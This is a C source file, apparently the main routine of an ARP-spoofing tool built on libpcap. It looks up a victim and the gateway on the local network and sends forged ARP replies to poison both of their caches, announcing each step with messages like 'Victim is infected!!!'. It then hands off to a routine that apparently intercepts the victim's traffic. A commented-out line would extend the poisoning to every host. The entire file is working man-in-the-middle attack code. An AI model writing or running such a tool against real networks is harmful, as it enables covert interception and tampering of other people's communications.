#include <stdio.h>
#include <pcap.h>
#include <netinet/ether.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <net/if_arp.h>
#include <string.h>

#include "get_network_info.h"
#include "arp_request.h"
#include "send_arp.h"
#include "send_arp_for_all_user.h"
#include "arp_spoofing.h"

int main(int argc, char *argv[])
{
	char *dev, errbuf[PCAP_ERRBUF_SIZE];
	pcap_t *handle;
	struct pcap_pkthdr header;
	const u_char *packet;
	struct ether_header *ether;
	struct ip *ipv4;
	struct tcphdr *tcp;
	struct arpheader *arphdr;
	int ip_hl, tcp_hl, total_hl, data_size;
	int i;
	struct ether_addr alonso_mac;
	struct in_addr alonso_ip, gateway_ip;
	struct ether_addr gateway_mac;
	struct ether_addr dlghwns817_mac;
	struct in_addr dlghwns817_ip;

	inet_aton(argv[1], &dlghwns817_ip);


	dev = pcap_lookupdev(errbuf);
	if(dev == NULL) {
		fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
		return(2);
	}

	handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
		return(2);
	}
	
	printf("Device: %s\n\n", dev);

	get_network_info(dev, &alonso_ip, &alonso_mac, &gateway_ip);

	printf("Gateway MAC: ");
	arp_request(handle, &alonso_ip, &alonso_mac, &gateway_ip, &gateway_mac);
	
	printf("Victim MAC: ");
	arp_request(handle, &alonso_ip, &alonso_mac, &dlghwns817_ip, &dlghwns817_mac);
	
	send_arp(handle, &dlghwns817_mac, &alonso_mac, &gateway_ip, &dlghwns817_ip);
	printf("Victim is infected!!!\n\n");
	
	//send_arp_for_all_user(handle, &alonso_mac, &gateway_ip);
	
	send_arp(handle, &gateway_mac, &alonso_mac, &dlghwns817_ip, &gateway_ip);
	printf("Gateway is infected!!!\n\n");

	arp_spoofing(handle, &alonso_ip, &alonso_mac, &dlghwns817_ip, &dlghwns817_mac, &gateway_ip, &gateway_mac);
	

	
	return(0);
}
